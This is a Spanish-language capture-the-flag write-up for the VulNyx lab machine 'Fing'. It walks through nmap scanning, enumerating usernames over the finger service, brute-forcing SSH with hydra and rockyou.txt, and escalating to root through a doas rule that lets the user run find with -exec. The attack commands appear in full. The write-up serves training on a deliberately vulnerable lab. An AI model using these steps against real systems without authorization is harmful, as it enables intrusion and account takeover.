# WriteUp: Fing | VulNyx

## Fase 1: Reconocimiento y Enumeración

Mi proceso para abordar esta máquina comenzó, como es habitual, con una fase de reconocimiento. Ejecuté un escaneo rápido con `nmap` para identificar todos los puertos TCP abiertos y obtener una visión general de la superficie de ataque.

```bash
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.27

PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
```

Con los puertos abiertos identificados (SSH, Finger y HTTP), realicé un segundo escaneo, esta vez más detallado, para determinar las versiones de los servicios en ejecución y recopilar cualquier información adicional que `nmap` pudiera ofrecerme.

```bash
nmap -sVC -p22,79,80 192.168.56.27

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

## Fase 2: Análisis de Vectores de Ataque

Inspeccioné primero el servidor web en el puerto 80, pero solo encontré la página de bienvenida por defecto de Apache, sin ningún contenido de interés.
![](Pasted%20image%2020251127015700.png)

El servicio que realmente captó mi atención fue `finger` en el puerto 79. No estaba familiarizado con él, así que investigué su propósito. Descubrí que Finger es un protocolo de red muy antiguo (data de los años 70) que permite a los usuarios consultar información sobre otros usuarios en un sistema remoto. Aunque hoy en día está en desuso por razones de seguridad, si está mal configurado puede revelar nombres de usuario válidos, directorios de inicio, la última fecha de conexión y otros metadatos útiles para un atacante.

Con esta información, mi primer paso fue intentar enumerar usuarios comunes para ver si el servicio me devolvía alguna información.

```bash
# Probé con una lista de nombres de usuario genéricos
for u in root admin user test guest tom jerry alice bob; do
  echo "== $u =="; finger $u@192.168.56.27;
done
```

Este simple bucle me dio mi primera pista importante.

```bash
== root ==
Login: root                           Name: root
Directory: /root                       Shell: /bin/bash
Last login Fri Jul 14 17:02 2023 (CEST) on tty1
No mail.
No Plan.
== admin ==
finger: admin: no such user.
...
```

El servicio confirmó la existencia del usuario `root`, pero los demás no existían. Atacar al usuario `root` directamente por SSH es, por lo general, una mala estrategia, ya que las configuraciones de seguridad modernas suelen restringir o monitorear intensivamente los inicios de sesión de este superusuario. Por lo tanto, decidí que mi mejor opción era encontrar un usuario con privilegios más bajos.

Para ello, automaticé la enumeración de usuarios utilizando una lista de nombres comunes de SecLists. El protocolo `finger` es ideal para esto, ya que me permite verificar la existencia de usuarios sin interactuar directamente con el servicio SSH, evitando así posibles bloqueos por parte de herramientas como `fail2ban`.

```bash
HOST=192.168.56.27
WORDLIST=/usr/share/seclists/Usernames/Names/names.txt

while read -r user; do
  printf "\n== %s ==\n" "$user"
  finger "${user}"@"${HOST}"
done < "$WORDLIST" > resultados_finger.txt
```

Tras dejar el script corriendo, revisé el archivo de resultados y busqué la palabra "Login", lo que me llevó a un descubrimiento clave:

```bash
== adam ==
Login: adam                           Name: adam
Directory: /home/adam                 Shell: /bin/bash
Last login Sun Apr 23 13:21 2023 (CEST) on pts/0 from 192.168.1.10
No mail.
No Plan.
```

¡Había encontrado un usuario válido: adam!

## Fase 3: Acceso Inicial vía SSH

Con un nombre de usuario confirmado, el siguiente paso lógico era realizar un ataque de fuerza bruta contra el servicio SSH para adivinar la contraseña de `adam`. Para esta tarea, utilicé `hydra` y el famoso diccionario `rockyou.txt`.

```bash
hydra -l adam -P /usr/share/wordlists/rockyou.txt 192.168.56.27 ssh
...
[22][ssh] host: 192.168.56.27   login: adam   password: XXXXXXXXXX
```

El ataque fue exitoso. Con la contraseña en mi poder, me conecté a la máquina a través de SSH.

```bash
ssh adam@192.168.56.27
...
adam@fing:~$ id
uid=1000(adam) gid=1000(adam) grupos=1000(adam)
```

## Fase 4: Escalada de Privilegios con <mark style="color:yellow;"></mark>`doas`

Una vez dentro, mi objetivo era escalar privilegios a `root`. Seguí mi metodología estándar de enumeración local, comenzando por verificar los permisos de `sudo` y buscando binarios con el bit SUID activado.

```bash
sudo -l
# No obtuve resultados.

find / -perm -u=s -type f 2>/dev/null
# RESULTADO
/usr/bin/mount
/usr/bin/su
...
/usr/bin/doas
...
```

La lista de binarios SUID contenía una entrada que me llamó poderosamente la atención: `/usr/bin/doas`. Nunca lo había visto, así que investigué sobre él. Aprendí que `doas` (Do as) es una alternativa moderna y más simple a `sudo`, originaria del proyecto OpenBSD. Su comportamiento se controla a través de un único archivo de configuración: `/etc/doas.conf`. Una mala configuración en este archivo podría permitirme ejecutar comandos como otro usuario, incluyendo `root`.

Decidí revisar el contenido de ese archivo de configuración.

```bash
adam@fing:/$ cat /etc/doas.conf
permit nopass keepenv adam as root cmd /usr/bin/find
```

¡Jackpot! La configuración era explícita y muy permisiva. La línea `permit nopass keepenv adam as root cmd /usr/bin/find` significa que mi usuario, `adam`, tiene permitido ejecutar el comando `/usr/bin/find` como el usuario `root` sin necesidad de introducir una contraseña (`nopass`).

El comando `find` es extremadamente potente y una de sus características más útiles (y peligrosas, en este caso) es la opción `-exec`, que permite ejecutar cualquier otro comando sobre los archivos que encuentra. Dado que `doas` me permitiría ejecutar `find` como `root`, cualquier comando que yo ejecutara a través de `-exec` también se ejecutaría como `root`.

Aproveché esta vulnerabilidad para obtener una shell de root interactiva.

```bash
adam@fing:/$ doas /usr/bin/find / -exec /bin/sh -i \;
```

Este comando le dice a `doas` que ejecute `find` como `root`. A su vez, `find` busca desde el directorio raíz (`/`) y, para cada resultado, ejecuta (`-exec`) una shell interactiva (`/bin/sh -i`). El resultado fue inmediato.

```bash
# id
uid=0(root) gid=0(root) grupos=0(root)
# cd /root
# cat root.txt
...
```

Con esto, obtuve una shell de `root`, completando así el compromiso total de la máquina.